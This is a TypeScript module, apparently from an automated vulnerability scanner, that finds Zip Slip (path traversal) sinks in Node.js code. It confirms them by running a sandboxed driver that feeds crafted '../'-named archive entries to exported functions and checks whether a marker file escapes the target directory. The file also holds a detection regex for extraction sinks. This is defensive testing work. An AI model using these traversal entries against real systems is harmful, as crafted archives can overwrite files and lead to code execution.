import { readFileSync } from "node:fs";
import { dirname, join, resolve } from "node:path";
import { fileURLToPath } from "node:url";
import type { Exploit } from "../types.js";
import type { Sandbox } from "../sandbox.js";
import { type Attacker, type StaticLead, NODE_RUN, NODE_SOURCE_RE, freshMarker, nodeExportedNames, scanSinkLeads } from "./attacker.js";

const HERE = dirname(fileURLToPath(import.meta.url));

// Zip Slip (CWE-22, archive variant): an extractor writes each archive entry to `join(destDir, name)`
// WITHOUT verifying the resolved path stays inside destDir. An entry named `../../x` then escapes and
// drops a file anywhere the process can write (config, cron, startup scripts → RCE). The find is an
// extraction/entry-write sink with no path-containment check; the proof is a FIRED escape: extract an
// entry whose path is `../marker` into a sandbox target dir and observe the marker file land OUTSIDE it.

// An archive-extraction / entry-write sink. The highest-signal shape is joining a target dir with an
// entry's OWN path (`path.join(dir, entry.name)`) — the exact spot a `../` escapes — so match that
// directly, plus the common archive verbs/libs.
const EXTRACT_SINK_RE =
  /\b(?:unzip\w*|untar\w*|unpack\w*|decompress\w*|extract(?:Archive|All|Entry|Entries|Tarball|To|Zip)\w*)\s*\(|\.\s*extract\s*\(|new\s+AdmZip\b|\byauzl\b|node-stream-zip|(?:path\.)?(?:join|resolve)\s*\(\s*[^,()]{1,40},\s*[A-Za-z_$][\w$]*\.(?:name|path|fileName|entryName|filename)\b/;

interface Entry {
  name: string;
  line: number;
  body: string;
}

/**
 * Drive the extractor with a malicious "archive" (an entry list whose path escapes via `../`) into a
 * fresh sandbox target dir, then check whether the planted marker landed OUTSIDE that dir. Fired = the
 * escape file exists in the parent with the marker — the extractor never contained the entry path. A
 * containment-checked extractor throws/skips the entry, so no file escapes. (Models the security-
 * critical extract-and-write step; a real archive-path extractor needs a driver that builds the archive.)
 */
function zipSlipDriver(moduleRel: string, fnName: string, marker: string): string {
  const mod = JSON.stringify("./" + moduleRel);
  const F = JSON.stringify(fnName);
  const MK = JSON.stringify(marker);
  return `
import { existsSync, readFileSync, rmSync } from "node:fs";
import { resolve } from "node:path";
const MK = ${MK};
let m;
try { m = await import(${mod}); } catch (e) { process.stdout.write("IMPORT_FAIL:" + e); process.exit(0); }
function pick(n){ if (m && typeof m[n]==="function") return m[n]; if (m && m.default && typeof m.default[n]==="function") return m.default[n]; return null; }
const fn = pick(${F});
if (!fn) { process.stdout.write("NOT_A_FUNCTION"); process.exit(0); }
const dest = resolve(process.cwd(), "rk-extract-" + MK);      // the intended extraction dir
const outside = resolve(process.cwd(), "ZS_" + MK);           // parent of dest — an entry must NOT reach here
const esc = "../ZS_" + MK;                                    // relative to dest -> outside
// an entry shaped for many extractors (name/path/fileName + data/content/buffer)
function entry(p){ return { name: p, path: p, fileName: p, filename: p, entryName: p, data: MK, content: MK, buffer: Buffer.from(MK), getData: () => Buffer.from(MK) }; }
const entries = [entry(esc), entry("../../ZS_" + MK)];
const attempts = [ () => fn(entries, dest), () => fn(dest, entries), () => fn(entries, { cwd: dest }), () => fn(entries, dest, {}), () => fn({ entries, dest }), () => fn(entries[0], dest) ];
for (const a of attempts){
  try { rmSync(outside, { force: true }); } catch(e){}
  try { await a(); } catch(e){}
  try {
    if (existsSync(outside) && readFileSync(outside, "utf8").includes(MK)){
      process.stdout.write("ZIPSLIP_FIRED escaped=" + outside);
      try { rmSync(outside, { force: true }); } catch(e){}
      process.exit(0);
    }
  } catch(e){}
}
process.stdout.write("no-zipslip");
`.trim();
}

export class ZipSlipAttacker implements Attacker {
  readonly attackClass = "zip-slip" as const;
  readonly canaryFixtureDir = resolve(HERE, "..", "..", "fixtures", "zip-slip-node");

  handles(file: string): boolean {
    return NODE_SOURCE_RE.test(file);
  }

  staticLeads(source: string): StaticLead[] {
    return scanSinkLeads(source, EXTRACT_SINK_RE);
  }

  hunt(targetDir: string, files: string[], sandbox: Sandbox): Exploit[] {
    const exploits: Exploit[] = [];
    for (const file of files) {
      if (!this.handles(file)) continue;
      let source: string;
      try {
        source = readFileSync(join(targetDir, file), "utf8");
      } catch {
        continue;
      }
      if (!EXTRACT_SINK_RE.test(source)) continue; // no extraction/entry-write sink here
      const names = nodeExportedNames(source);
      if (names.length === 0) continue;

      let fired = false;
      for (const name of names) {
        if (fired) break;
        const marker = freshMarker();
        const driverRel = `.raeuber-zipslip-${marker}.mjs`;
        sandbox.writeFile(driverRel, zipSlipDriver(file, name, marker));
        const run = sandbox.exec(`${NODE_RUN} ${driverRel} 2>&1`, 15_000);
        const out = run.stdout + run.stderr;
        if (!out.includes("ZIPSLIP_FIRED")) continue;
        exploits.push({
          attackClass: "zip-slip",
          proof: "extraction-escaped",
          file,
          line: 1,
          sink: `archive-extract(${name})`,
          summary:
            `Exported \`${name}()\` writes archive entries under a target directory without a path-containment check; an entry named \`../…\` was written OUTSIDE the extraction directory (CWE-22 / Zip Slip). A crafted archive can drop files anywhere the process can write (config/cron/startup → RCE).`,
          payload: `${name}([{ name: "../ZS_${marker}", data: "${marker}" }], "<destDir>")`,
          evidence:
            `driver extracted an entry with a \`../\` path into a sandbox target dir; the marker file ` +
            `\`${marker}\` landed OUTSIDE the target dir — the extractor did not contain the entry path:\n` +
            out.slice(0, 500),
        });
        fired = true;
      }
    }
    return exploits;
  }
}
